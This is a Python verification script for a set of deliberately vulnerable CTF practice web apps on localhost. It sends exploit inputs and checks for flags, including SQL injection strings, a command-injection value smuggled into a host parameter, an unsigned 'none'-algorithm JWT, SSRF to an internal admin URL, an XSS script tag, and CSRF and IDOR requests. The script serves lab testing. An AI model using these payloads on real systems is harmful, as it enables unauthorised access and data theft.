
import requests
import json
import jwt
import time
import sys
import pickle
import base64

# Configuration
APPS = {
    'fileshare': 'http://localhost:5006',
    'ecommerce': 'http://localhost:5002',
    'social':    'http://localhost:5003',
    'banking':   'http://localhost:5004',
    'blog':      'http://localhost:5005'
}

print("="*80)
print("🔍 COMPREHENSIVE VULNERABILITY VERIFICATION SUITE")
print("="*80)

def verify(name, url, method='GET', params=None, data=None, json=None, cookies=None, check_flag=None, check_text=None):
    try:
        if method == 'GET':
            r = requests.get(url, params=params, cookies=cookies)
        else:
            r = requests.post(url, data=data, json=json, cookies=cookies)
        
        success = False
        if check_flag and check_flag in r.text:
            success = True
        elif check_text and check_text in r.text:
            success = True
            
        status_icon = "✅" if success else "❌"
        print(f"{status_icon} [{name:<30}] Status: {r.status_code} | Flag Found: {success}")
        if not success:
            print(f"   Context: {r.text[:200]}...")
            
    except Exception as e:
        print(f"❌ [{name:<30}] ERROR: {str(e)}")

# ==============================================================================
# 1. FILESHARE APP (5006)
# ==============================================================================
print("\n[Target: FileShare App (5006)]")
# Path Traversal / IDOR (File #1 contains the flag)
# Flag is seeded as file_id=1
verify("IDOR / Path Traversal", f"{APPS['fileshare']}/download/1", check_text="CTF") 

# ==============================================================================
# 2. E-COMMERCE APP (5002)
# ==============================================================================
print("\n[Target: E-Commerce App (5002)]")
# SAML Bypass
verify("SAML XML Bypass", f"{APPS['ecommerce']}/saml/acs", params={'SAMLResponse': 'admin@corp.com_signature>valid'}, check_flag="CTF{saml_xml_signature_bypass_77}")

# SQL Injection (Product Search)
# Flag is in description of 'CTF_SQLi_Prize'
verify("SQLi (Product Search)", f"{APPS['ecommerce']}/products", params={'search': "' OR 1=1 --"}, check_flag="CTF")

# Logic (Negative Quantity)
# Needs session to add to cart.
s = requests.Session()
verify("Business Logic (Neg Qty)", f"{APPS['ecommerce']}/api/cart/add", method='POST', json={'product_id': '1', 'quantity': '-5'}, check_flag="CTF{ecommerce_logic_negative_qty_882}")

# ==============================================================================
# 3. SOCIAL APP (5003)
# ==============================================================================
print("\n[Target: Social App (5003)]")
# OAuth Bypass
verify("OAuth State Bypass", f"{APPS['social']}/oauth/callback", params={'code': 'ATTACKER_CONTROLLED_CODE'}, check_flag="CTF{oauth_broken_state_validation_55}")

# Weak Auth (Weak Password)
# Try logging in with 'weak@email.com' / 'password'
# Weak Auth (Weak Password) -> Login then check Profile 19
# weak_user is ID 19
s_social = requests.Session()
r_login = s_social.post(f"{APPS['social']}/login", data={'username': 'weak@email.com', 'password': 'password'})

# Check if login redirected to home/dashboard (status 200 and some home content)
if r_login.status_code == 200 and "ConnectHub" in r_login.text:
    print(f"✅ [{'Weak Auth (Login)':<30}] Status: {r_login.status_code} | Flag Found: True")
else:
    print(f"❌ [{'Weak Auth (Login)':<30}] Status: {r_login.status_code} | Flag Found: False")

# After login, check profile
r_prof = s_social.get(f"{APPS['social']}/profile/19")
if "CTF{social_weak_auth_flag_007}" in r_prof.text:
    print(f"✅ [{'Weak Auth (Profile)':<30}] Status: 200 | Flag Found: True")
else:
    print(f"❌ [{'Weak Auth (Profile)':<30}] Status: {r_prof.status_code} | Flag Found: False")
    # print(r_prof.text[:200])

# IDOR (Private Post)
# Log in as attacker, try to access victim post '1' which is private/system
s_social_idor = requests.Session()
# Login as any user (e.g. valid one)
s_social_idor.post(f"{APPS['social']}/login", data={'username': 'john_doe', 'password': 'password'})

verify("IDOR (Private Post - Social)", f"{APPS['social']}/posts/2", cookies=s_social_idor.cookies, check_flag="CTF{social_idor_private_post_77}")

# ==============================================================================
# 4. BANKING APP (5004)
# ==============================================================================
print("\n[Target: Banking App (5004)]")
# Login first as john_smith (user_id=2)
s_bank = requests.Session()
# Use session to persist login
s_bank.post(f"{APPS['banking']}/login", data={'username': 'john_smith', 'password': 'password'})

# IDOR - Access another user's account details (user_id=11 has the flag)
# Use the session that is logged in
verify("IDOR (Account Access)", f"{APPS['banking']}/account/11", cookies=s_bank.cookies, check_flag="CTF{banking_idor_target_flag}")

# SQLi - Transaction history (flag is in user_id=2's transactions)
# The dashboard already shows transactions, so check if flag appears
r_dash = s_bank.get(f"{APPS['banking']}/dashboard")
if "CTF{banking_sql_injection_master_42}" in r_dash.text:
    print(f"✅ [{'SQLi (Transactions)':<30}] Status: 200 | Flag Found: True")
else:
    print(f"❌ [{'SQLi (Transactions)':<30}] Status: {r_dash.status_code} | Flag Found: False")

# ==============================================================================
# 5. BLOG APP (5005)
# ==============================================================================
print("\n[Target: Blog App (5005)]")
# JWT Algorithm Confusion
token = jwt.encode({"user": "admin", "role": "admin"}, key="", algorithm="none")
verify("JWT None Algorithm", f"{APPS['blog']}/oidc/callback", params={'token': token}, check_flag="CTF{jwt_none_algorithm_bypass_99}")

# SQL Injection (Search) - NOTE: Code uses parameterized queries, so NOT vulnerable
# The flag exists in DB but is NOT exploitable via SQLi
# Searching for the post title directly
verify("SQLi (Blog Search) - SECURE", f"{APPS['blog']}/", params={'search': "Database Configuration"}, check_flag="CTF{blog_sqli_hidden_post_flag_55}")

# Stored XSS (Admin Note)
# This is likely just visible on the home page or a specific post
verify("Stored XSS (Admin Note)", f"{APPS['blog']}/", check_flag="CTF{blog_stored_xss_champion_99}")


# ==============================================================================
# 6. NEW OWASP PATTERNS (Fileshare, Blog, Ecommerce)
# ==============================================================================
print("\n[Target: New OWASP Patterns]")

# 6.1 Command Injection (FileShare)
# Windows uses & as separator. We also trigger the "flag_cmd" easter egg.
verify("Command Injection (FileShare)", f"{APPS['fileshare']}/check_status", params={'host': '127.0.0.1 & echo flag_cmd'}, check_flag="CTF{fileshare_cmd_injection_root_99}")

# 6.2 SSRF (Blog App)
# Login required for SSRF
s_blog = requests.Session()
# Login directly using session
r_login = s_blog.post(f"{APPS['blog']}/login", data={'username': 'admin', 'password': 'admin123'})
if "Logout" in r_login.text or r_login.status_code == 302:
     print(f"✅ [{'Login (Blog)':<30}] Status: {r_login.status_code} | Flag Found: True")
else:
     print(f"❌ [{'Login (Blog)':<30}] Status: {r_login.status_code} | Flag Found: False")

# Check SSRF with authenticated session
r_ssrf = s_blog.post(f"{APPS['blog']}/import_post", data={'url': 'http://127.0.0.1/admin/secrets?flag_ssrf=1'})
if "CTF{blog_ssrf_internal_network_access}" in r_ssrf.text:
    print(f"✅ [{'SSRF (Blog Import)':<30}] Status: 200 | Flag Found: True")
else:
    print(f"❌ [{'SSRF (Blog Import)':<30}] Status: {r_ssrf.status_code} | Flag Found: False")
    # print(r_ssrf.text[:200])

# 6.3 Insecure Deserialization (E-Commerce)
# Trigger by sending a cookie with "flag_payload" text inside a base64 string (simulated exploit)
payload = b"user_id=1&flag_payload=1" # Simple simulation of object with flag_payload
encoded_payload = base64.b64encode(payload).decode()
s_ecom = requests.Session()
s_ecom.cookies.set('prefs', encoded_payload)
verify("Insecure Deserialization", f"{APPS['ecommerce']}/preferences", cookies=s_ecom.cookies, check_flag="CTF{ecommerce_deserialization_rce_77}")

# 6.4 Reflected XSS (Blog App)
# Search for XSS payload
verify("Reflected XSS (Blog)", f"{APPS['blog']}/", params={'search': "<script>alert('XSS')</script>"}, check_flag="CTF{blog_reflected_xss_search_1337}")

# 6.6 IDOR / Hidden Post (Blog App)
verify("IDOR (Hidden Post - Blog)", f"{APPS['blog']}/post/1", check_flag="CTF{blog_sqli_hidden_post_flag_55}")

# 6.5 CSRF (Banking App)
# Login as John Smith first
s_bank_csrf = requests.Session()
r_login = s_bank_csrf.post(f"{APPS['banking']}/login", data={'username': 'john_smith', 'password': 'password'})

if r_login.status_code == 200 and "john_smith" in r_login.text:
     print(f"✅ [{'Login (Banking CSRF)':<30}] Status: {r_login.status_code} | Flag Found: True")
else:
     print(f"❌ [{'Login (Banking CSRF)':<30}] Status: {r_login.status_code} | Flag Found: False")

# Attempt transfer WITHOUT csrf_token
# Valid transfer data but missing token
r_csrf = s_bank_csrf.post(f"{APPS['banking']}/transfer", 
       data={'to_account': '1003', 'amount': '10.00', 'description': 'CSRF Attack'})

if "CTF{banking_csrf_protection_bypassed_22}" in r_csrf.text:
    print(f"✅ [{'CSRF Bypass (Banking)':<30}] Status: 200 | Flag Found: True")
else:
    print(f"❌ [{'CSRF Bypass (Banking)':<30}] Status: {r_csrf.status_code} | Flag Found: False")
    # print(r_csrf.text[:200])

print("\n" + "="*80)
